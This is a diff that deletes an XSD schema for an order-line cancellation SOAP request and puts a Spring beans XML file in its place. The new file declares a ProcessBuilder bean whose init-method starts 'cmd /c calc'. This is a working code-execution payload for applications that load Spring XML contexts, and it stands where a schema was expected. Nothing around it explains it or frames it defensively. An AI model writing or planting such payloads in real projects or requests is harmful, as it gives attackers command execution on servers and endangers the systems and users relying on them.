@@ -1,24 +1,11 @@
-<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"
-           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
-           xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <xs:element name="Cancel_OrderLineReq">
-    <xs:complexType>
-      <xs:sequence>
-        <xs:element name="Data">
-          <xs:complexType>
-            <xs:sequence>
-              <xs:element name="Delivery" maxOccurs="unbounded" minOccurs="0">
-                <xs:complexType>
-                  <xs:sequence>
-                    <xs:element type="xs:int" name="Delivery_No"/>
-                    <xs:element type="xs:string" name="Reason"/>
-                  </xs:sequence>
-                </xs:complexType>
-              </xs:element>
-            </xs:sequence>
-          </xs:complexType>
-        </xs:element>
-      </xs:sequence>
-    </xs:complexType>
-  </xs:element>
-</xs:schema>
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>cmd</value>
+        <value>/c</value>
+        <value><![CDATA[calc]]></value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
